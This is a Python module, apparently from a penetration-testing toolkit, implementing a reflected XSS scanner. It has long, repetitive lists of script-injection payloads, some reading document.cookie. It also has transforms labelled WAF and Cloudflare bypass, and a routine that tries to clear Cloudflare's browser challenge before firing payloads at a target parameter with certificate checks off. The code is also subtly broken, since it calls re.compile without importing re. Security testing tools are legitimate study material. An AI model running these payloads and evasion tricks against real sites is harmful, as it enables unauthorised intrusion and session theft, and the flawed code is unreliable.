import requests
import urllib.parse
import random
import time
from bs4 import BeautifulSoup

class ReflectedXSSScanner:
    def __init__(self):
        self.options = {
            "URL": "",
            "PARAM": "",
            "METHOD": "GET",
            "TIMEOUT": "10",
            "DELAY": "0",
            "COOKIE": "",
            "USER_AGENT": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "HEADERS": "",
            "RANDOM_CASE": False,
            "RANDOM_SPACE": False,
            "ENCODE_BYPASS": False,
            "ATTRIB_BYPASS": False,
            "EVENT_BYPASS": False,
            "TAG_BYPASS": False,
            "CONTEXT_BYPASS": False,
            "CF_BYPASS": False,
            "WAF_BYPASS": False
        }
        
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "'\"><img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<link rel=import href=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<isindex type=image src=1 onerror=alert('XSS')>",
            "<isindex action=javascript:alert('XSS') type=image>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
            "<meta http-equiv=refresh content=0;javascript:alert('XSS')>",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><script>alert('XSS')</script>",
            "';alert(String.fromCharCode(88,83,83));//",
            "';alert(String.fromCharCode(88,83,83));",
            "<script>alert(/XSS/)</script>",
            "<script>alert(document.cookie)</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(document.documentElement.innerHTML)</script>",
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "<img src=x onerror=alert(document.cookie)>",
            "<img src=x onerror=alert(document.domain)>",
            "<svg/onload=alert(String.fromCharCode(88,83,83))>",
            "<svg/onload=alert(document.cookie)>",
            "<svg/onload=alert(document.domain)>",
            "<body onload=alert(String.fromCharCode(88,83,83))>",
            "<body onload=alert(document.cookie)>",
            "<body onload=alert(document.domain)>",
            "<input onfocus=alert(String.fromCharCode(88,83,83)) autofocus>",
            "<input onfocus=alert(document.cookie) autofocus>",
            "<input onfocus=alert(document.domain) autofocus>",
            "<select onfocus=alert(String.fromCharCode(88,83,83)) autofocus>",
            "<select onfocus=alert(document.cookie) autofocus>",
            "<select onfocus=alert(document.domain) autofocus>",
            "<textarea onfocus=alert(String.fromCharCode(88,83,83)) autofocus>",
            "<textarea onfocus=alert(document.cookie) autofocus>",
            "<textarea onfocus=alert(document.domain) autofocus>",
            "<keygen onfocus=alert(String.fromCharCode(88,83,83)) autofocus>",
            "<keygen onfocus=alert(document.cookie) autofocus>",
            "<keygen onfocus=alert(document.domain) autofocus>",
            "<video><source onerror=alert(String.fromCharCode(88,83,83))>",
            "<video><source onerror=alert(document.cookie)>",
            "<video><source onerror=alert(document.domain)>",
            "<audio src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "<audio src=x onerror=alert(document.cookie)>",
            "<audio src=x onerror=alert(document.domain)>",
            "<details open ontoggle=alert(String.fromCharCode(88,83,83))>",
            "<details open ontoggle=alert(document.cookie)>",
            "<details open ontoggle=alert(document.domain)>",
            "<marquee onstart=alert(String.fromCharCode(88,83,83))>",
            "<marquee onstart=alert(document.cookie)>",
            "<marquee onstart=alert(document.domain)>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "'\"><script>alert(document.cookie)</script>",
            "'\"><script>alert(document.domain)</script>",
            "'\"><img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "'\"><img src=x onerror=alert(document.cookie)>",
            "'\"><img src=x onerror=alert(document.domain)>",
            "javascript:alert(String.fromCharCode(88,83,83))",
            "javascript:alert(document.cookie)",
            "javascript:alert(document.domain)",
            "<iframe src=javascript:alert(String.fromCharCode(88,83,83))>",
            "<iframe src=javascript:alert(document.cookie)>",
            "<iframe src=javascript:alert(document.domain)>",
            "<link rel=import href=javascript:alert(String.fromCharCode(88,83,83))>",
            "<link rel=import href=javascript:alert(document.cookie)>",
            "<link rel=import href=javascript:alert(document.domain)>",
            "<object data=javascript:alert(String.fromCharCode(88,83,83))>",
            "<object data=javascript:alert(document.cookie)>",
            "<object data=javascript:alert(document.domain)>",
            "<isindex type=image src=1 onerror=alert(String.fromCharCode(88,83,83))>",
            "<isindex type=image src=1 onerror=alert(document.cookie)>",
            "<isindex type=image src=1 onerror=alert(document.domain)>",
            "<isindex action=javascript:alert(String.fromCharCode(88,83,83)) type=image>",
            "<isindex action=javascript:alert(document.cookie) type=image>",
            "<isindex action=javascript:alert(document.domain) type=image>",
            "<meta http-equiv=refresh content=0;url=javascript:alert(String.fromCharCode(88,83,83))>",
            "<meta http-equiv=refresh content=0;url=javascript:alert(document.cookie)>",
            "<meta http-equiv=refresh content=0;url=javascript:alert(document.domain)>",
            "<meta http-equiv=refresh content=0;javascript:alert(String.fromCharCode(88,83,83))>",
            "<meta http-equiv=refresh content=0;javascript:alert(document.cookie)>",
            "<meta http-equiv=refresh content=0;javascript:alert(document.domain)>",
            "<svg><script>alert(String.fromCharCode(88,83,83))</script></svg>",
            "<svg><script>alert(document.cookie)</script></svg>",
            "<svg><script>alert(document.domain)</script></svg>",
            "<svg><script>alert(String.fromCharCode(88,83,83))",
            "<svg><script>alert(document.cookie)",
            "<svg><script>alert(document.domain)",
            "';alert(String.fromCharCode(88,83,83));//",
            "';alert(document.cookie);//",
            "';alert(document.domain);//",
            "';alert(String.fromCharCode(88,83,83));",
            "';alert(document.cookie);",
            "';alert(document.domain);",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(document.cookie)</script>",
            "<script>alert(document.domain)</script>"
        ]
        
        self.waf_bypass_payloads = [
            "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "'\"><img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<link rel=import href=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<isindex type=image src=1 onerror=alert('XSS')>",
            "<isindex action=javascript:alert('XSS') type=image>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
            "<meta http-equiv=refresh content=0;javascript:alert('XSS')>",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><script>alert('XSS')</script>",
            "';alert(String.fromCharCode(88,83,83));//",
            "';alert(String.fromCharCode(88,83,83));",
            "<script>alert(/XSS/)</script>",
            "<script>alert(document.cookie)</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(document.documentElement.innerHTML)</script>",
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "<img src=x onerror=alert(document.cookie)>",
            "<img src=x onerror=alert(document.domain)>",
            "<svg/onload=alert(String.fromCharCode(88,83,83))>",
            "<svg/onload=alert(document.cookie)>",
            "<svg/onload=alert(document.domain)>",
            "<body onload=alert(String.fromCharCode(88,83,83))>",
            "<body onload=alert(document.cookie)>",
            "<body onload=alert(document.domain)>",
            "<input onfocus=alert(String.fromCharCode(88,83,83)) autofocus>",
            "<input onfocus=alert(document.cookie) autofocus>",
            "<input onfocus=alert(document.domain) autofocus>",
            "<select onfocus=alert(String.fromCharCode(88,83,83)) autofocus>",
            "<select onfocus=alert(document.cookie) autofocus>",
            "<select onfocus=alert(document.domain) autofocus>",
            "<textarea onfocus=alert(String.fromCharCode(88,83,83)) autofocus>",
            "<textarea onfocus=alert(document.cookie) autofocus>",
            "<textarea onfocus=alert(document.domain) autofocus>",
            "<keygen onfocus=alert(String.fromCharCode(88,83,83)) autofocus>",
            "<keygen onfocus=alert(document.cookie) autofocus>",
            "<keygen onfocus=alert(document.domain) autofocus>",
            "<video><source onerror=alert(String.fromCharCode(88,83,83))>",
            "<video><source onerror=alert(document.cookie)>",
            "<video><source onerror=alert(document.domain)>",
            "<audio src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "<audio src=x onerror=alert(document.cookie)>",
            "<audio src=x onerror=alert(document.domain)>",
            "<details open ontoggle=alert(String.fromCharCode(88,83,83))>",
            "<details open ontoggle=alert(document.cookie)>",
            "<details open ontoggle=alert(document.domain)>",
            "<marquee onstart=alert(String.fromCharCode(88,83,83))>",
            "<marquee onstart=alert(document.cookie)>",
            "<marquee onstart=alert(document.domain)>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "'\"><script>alert(document.cookie)</script>",
            "'\"><script>alert(document.domain)</script>",
            "'\"><img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "'\"><img src=x onerror=alert(document.cookie)>",
            "'\"><img src=x onerror=alert(document.domain)>",
            "javascript:alert(String.fromCharCode(88,83,83))",
            "javascript:alert(document.cookie)",
            "javascript:alert(document.domain)",
            "<iframe src=javascript:alert(String.fromCharCode(88,83,83))>",
            "<iframe src=javascript:alert(document.cookie)>",
            "<iframe src=javascript:alert(document.domain)>",
            "<link rel=import href=javascript:alert(String.fromCharCode(88,83,83))>",
            "<link rel=import href=javascript:alert(document.cookie)>",
            "<link rel=import href=javascript:alert(document.domain)>",
            "<object data=javascript:alert(String.fromCharCode(88,83,83))>",
            "<object data=javascript:alert(document.cookie)>",
            "<object data=javascript:alert(document.domain)>",
            "<isindex type=image src=1 onerror=alert(String.fromCharCode(88,83,83))>",
            "<isindex type=image src=1 onerror=alert(document.cookie)>",
            "<isindex type=image src=1 onerror=alert(document.domain)>",
            "<isindex action=javascript:alert(String.fromCharCode(88,83,83)) type=image>",
            "<isindex action=javascript:alert(document.cookie) type=image>",
            "<isindex action=javascript:alert(document.domain) type=image>",
            "<meta http-equiv=refresh content=0;url=javascript:alert(String.fromCharCode(88,83,83))>",
            "<meta http-equiv=refresh content=0;url=javascript:alert(document.cookie)>",
            "<meta http-equiv=refresh content=0;url=javascript:alert(document.domain)>",
            "<meta http-equiv=refresh content=0;javascript:alert(String.fromCharCode(88,83,83))>",
            "<meta http-equiv=refresh content=0;javascript:alert(document.cookie)>",
            "<meta http-equiv=refresh content=0;javascript:alert(document.domain)>",
            "<svg><script>alert(String.fromCharCode(88,83,83))</script></svg>",
            "<svg><script>alert(document.cookie)</script></svg>",
            "<svg><script>alert(document.domain)</script></svg>",
            "<svg><script>alert(String.fromCharCode(88,83,83))",
            "<svg><script>alert(document.cookie)",
            "<svg><script>alert(document.domain)",
            "';alert(String.fromCharCode(88,83,83));//",
            "';alert(document.cookie);//",
            "';alert(document.domain);//",
            "';alert(String.fromCharCode(88,83,83));",
            "';alert(document.cookie);",
            "';alert(document.domain);",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(document.cookie)</script>",
            "<script>alert(document.domain)</script>"
        ]
        
        self.cf_bypass_payloads = [
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "'\"><img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<link rel=import href=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<isindex type=image src=1 onerror=alert('XSS')>",
            "<isindex action=javascript:alert('XSS') type=image>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
            "<meta http-equiv=refresh content=0;javascript:alert('XSS')>",
            "<svg><script>alert('XSS')</script></svg>",
            "<svg><script>alert('XSS')</script>",
            "';alert(String.fromCharCode(88,83,83));//",
            "';alert(String.fromCharCode(88,83,83));",
            "<script>alert(/XSS/)</script>",
            "<script>alert(document.cookie)</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(document.documentElement.innerHTML)</script>",
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "<img src=x onerror=alert(document.cookie)>",
            "<img src=x onerror=alert(document.domain)>",
            "<svg/onload=alert(String.fromCharCode(88,83,83))>",
            "<svg/onload=alert(document.cookie)>",
            "<svg/onload=alert(document.domain)>",
            "<body onload=alert(String.fromCharCode(88,83,83))>",
            "<body onload=alert(document.cookie)>",
            "<body onload=alert(document.domain)>",
            "<input onfocus=alert(String.fromCharCode(88,83,83)) autofocus>",
            "<input onfocus=alert(document.cookie) autofocus>",
            "<input onfocus=alert(document.domain) autofocus>",
            "<select onfocus=alert(String.fromCharCode(88,83,83)) autofocus>",
            "<select onfocus=alert(document.cookie) autofocus>",
            "<select onfocus=alert(document.domain) autofocus>",
            "<textarea onfocus=alert(String.fromCharCode(88,83,83)) autofocus>",
            "<textarea onfocus=alert(document.cookie) autofocus>",
            "<textarea onfocus=alert(document.domain) autofocus>",
            "<keygen onfocus=alert(String.fromCharCode(88,83,83)) autofocus>",
            "<keygen onfocus=alert(document.cookie) autofocus>",
            "<keygen onfocus=alert(document.domain) autofocus>",
            "<video><source onerror=alert(String.fromCharCode(88,83,83))>",
            "<video><source onerror=alert(document.cookie)>",
            "<video><source onerror=alert(document.domain)>",
            "<audio src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "<audio src=x onerror=alert(document.cookie)>",
            "<audio src=x onerror=alert(document.domain)>",
            "<details open ontoggle=alert(String.fromCharCode(88,83,83))>",
            "<details open ontoggle=alert(document.cookie)>",
            "<details open ontoggle=alert(document.domain)>",
            "<marquee onstart=alert(String.fromCharCode(88,83,83))>",
            "<marquee onstart=alert(document.cookie)>",
            "<marquee onstart=alert(document.domain)>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "'\"><script>alert(document.cookie)</script>",
            "'\"><script>alert(document.domain)</script>",
            "'\"><img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "'\"><img src=x onerror=alert(document.cookie)>",
            "'\"><img src=x onerror=alert(document.domain)>",
            "javascript:alert(String.fromCharCode(88,83,83))",
            "javascript:alert(document.cookie)",
            "javascript:alert(document.domain)",
            "<iframe src=javascript:alert(String.fromCharCode(88,83,83))>",
            "<iframe src=javascript:alert(document.cookie)>",
            "<iframe src=javascript:alert(document.domain)>",
            "<link rel=import href=javascript:alert(String.fromCharCode(88,83,83))>",
            "<link rel=import href=javascript:alert(document.cookie)>",
            "<link rel=import href=javascript:alert(document.domain)>",
            "<object data=javascript:alert(String.fromCharCode(88,83,83))>",
            "<object data=javascript:alert(document.cookie)>",
            "<object data=javascript:alert(document.domain)>",
            "<isindex type=image src=1 onerror=alert(String.fromCharCode(88,83,83))>",
            "<isindex type=image src=1 onerror=alert(document.cookie)>",
            "<isindex type=image src=1 onerror=alert(document.domain)>",
            "<isindex action=javascript:alert(String.fromCharCode(88,83,83)) type=image>",
            "<isindex action=javascript:alert(document.cookie) type=image>",
            "<isindex action=javascript:alert(document.domain) type=image>",
            "<meta http-equiv=refresh content=0;url=javascript:alert(String.fromCharCode(88,83,83))>",
            "<meta http-equiv=refresh content=0;url=javascript:alert(document.cookie)>",
            "<meta http-equiv=refresh content=0;url=javascript:alert(document.domain)>",
            "<meta http-equiv=refresh content=0;javascript:alert(String.fromCharCode(88,83,83))>",
            "<meta http-equiv=refresh content=0;javascript:alert(document.cookie)>",
            "<meta http-equiv=refresh content=0;javascript:alert(document.domain)>",
            "<svg><script>alert(String.fromCharCode(88,83,83))</script></svg>",
            "<svg><script>alert(document.cookie)</script></svg>",
            "<svg><script>alert(document.domain)</script></svg>",
            "<svg><script>alert(String.fromCharCode(88,83,83))",
            "<svg><script>alert(document.cookie)",
            "<svg><script>alert(document.domain)",
            "';alert(String.fromCharCode(88,83,83));//",
            "';alert(document.cookie);//",
            "';alert(document.domain);//",
            "';alert(String.fromCharCode(88,83,83));",
            "';alert(document.cookie);",
            "';alert(document.domain);",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(document.cookie)</script>",
            "<script>alert(document.domain)</script>"
        ]
    
    def set_option(self, key, value):
        self.options[key] = value
    
    def get_option(self, key):
        return self.options[key]
    
    def process_payload(self, payload):
        if self.get_option("RANDOM_CASE"):
            payload = self.random_case(payload)
        
        if self.get_option("RANDOM_SPACE"):
            payload = self.random_space(payload)
        
        if self.get_option("ENCODE_BYPASS"):
            payload = self.encode_bypass(payload)
        
        if self.get_option("ATTRIB_BYPASS"):
            payload = self.attrib_bypass(payload)
        
        if self.get_option("EVENT_BYPASS"):
            payload = self.event_bypass(payload)
        
        if self.get_option("TAG_BYPASS"):
            payload = self.tag_bypass(payload)
        
        if self.get_option("CONTEXT_BYPASS"):
            payload = self.context_bypass(payload)
        
        return payload
    
    def random_case(self, payload):
        return ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in payload)
    
    def random_space(self, payload):
        result = []
        for c in payload:
            result.append(c)
            if c == ' ' and random.random() > 0.5:
                result.append(random.choice([' ', '/**/', '%20', '+']))
        return ''.join(result)
    
    def encode_bypass(self, payload):
        return payload.replace('<', '%3C').replace('>', '%3E').replace('/', '%2F')
    
    def attrib_bypass(self, payload):
        return payload.replace('onerror', 'o n e r r o r').replace('onload', 'o n l o a d')
    
    def event_bypass(self, payload):
        return payload.replace('onerror', 'onerror\x00').replace('onload', 'onload\x00')
    
    def tag_bypass(self, payload):
        return payload.replace('<script', '<scr<script>ipt').replace('</script>', '</scr<script>ipt>')
    
    def context_bypass(self, payload):
        return payload.replace('<script>', '<img src=x onerror=alert(1)>').replace('</script>', '')
    
    def get_cloudflare_cookies(self, url):
        try:
            session = requests.Session()
            response = session.get(url, timeout=int(self.get_option("TIMEOUT")), verify=False)
            
            if 'cf_clearance' in response.cookies:
                return {'cf_clearance': response.cookies.get('cf_clearance')}
            
            soup = BeautifulSoup(response.text, 'html.parser')
            js_challenge = soup.find('script', string=re.compile('setTimeout'))
            
            if js_challenge:
                time.sleep(5)
                response = session.get(url, timeout=int(self.get_option("TIMEOUT")), verify=False)
                if 'cf_clearance' in response.cookies:
                    return {'cf_clearance': response.cookies.get('cf_clearance')}
            
            return None
        except:
            return None
    
    def run(self):
        url = self.get_option("URL")
        param = self.get_option("PARAM")
        method = self.get_option("METHOD").upper()
        timeout = int(self.get_option("TIMEOUT"))
        delay = int(self.get_option("DELAY"))
        
        headers = {
            "User-Agent": self.get_option("USER_AGENT"),
            "Cookie": self.get_option("COOKIE")
        }
        
        if self.get_option("HEADERS"):
            try:
                for header in self.get_option("HEADERS").split("\\n"):
                    if ":" in header:
                        key, value = header.split(":", 1)
                        headers[key.strip()] = value.strip()
            except:
                pass
        
        cookies = {}
        
        if self.get_option("CF_BYPASS"):
            cf_cookies = self.get_cloudflare_cookies(url)
            if cf_cookies:
                cookies.update(cf_cookies)
        
        vulnerabilities = []
        
        payloads_to_test = self.payloads
        
        if self.get_option("WAF_BYPASS"):
            payloads_to_test = self.waf_bypass_payloads
        
        if self.get_option("CF_BYPASS"):
            payloads_to_test = self.cf_bypass_payloads
        
        for i, payload in enumerate(payloads_to_test, 1):
            if delay > 0:
                time.sleep(delay)
            
            processed_payload = self.process_payload(payload)
            
            vulnerable, vuln_type = self.test_payload(url, param, processed_payload, method, timeout, headers, cookies)
            
            if vulnerable:
                vulnerabilities.append({
                    "payload": payload,
                    "type": vuln_type,
                    "parameter": param
                })
        
        if vulnerabilities:
            return {
                "success": True,
                "message": f"Found {len(vulnerabilities)} vulnerabilities",
                "vulnerabilities": vulnerabilities
            }
        else:
            return {
                "success": True,
                "message": "No vulnerabilities found"
            }
    
    def test_payload(self, url, param, payload, method, timeout, headers, cookies):
        try:
            if method == "GET":
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                response = requests.get(test_url, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            else:
                data = {param: payload}
                response = requests.post(url, data=data, timeout=timeout, verify=False, headers=headers, cookies=cookies)
            
            if payload in response.text:
                return True, "Reflected XSS"
            
            if "alert(" in response.text or "javascript:" in response.text:
                return True, "Potential Reflected XSS"
            
            soup = BeautifulSoup(response.text, 'html.parser')
            tags = soup.find_all(['script', 'img', 'svg', 'body', 'input', 'select', 'textarea', 'keygen', 'video', 'audio', 'details', 'marquee'])
            
            for tag in tags:
                if tag.has_attr('src') and 'javascript:' in tag['src']:
                    return True, "Reflected XSS in src attribute"
                
                if tag.has_attr('onerror') or tag.has_attr('onload') or tag.has_attr('onfocus'):
                    return True, "Reflected XSS in event handler"
                
                if tag.has_attr('data') and 'javascript:' in tag['data']:
                    return True, "Reflected XSS in data attribute"
                
                if tag.has_attr('href') and 'javascript:' in tag['href']:
                    return True, "Reflected XSS in href attribute"
                
                if tag.has_attr('action') and 'javascript:' in tag['action']:
                    return True, "Reflected XSS in action attribute"
                
                if tag.has_attr('content') and 'javascript:' in tag['content']:
                    return True, "Reflected XSS in content attribute"
            
            if "alert(" in response.text or "javascript:" in response.text:
                return True, "Potential Reflected XSS"
            
        except Exception:
            pass
        
        return False, None
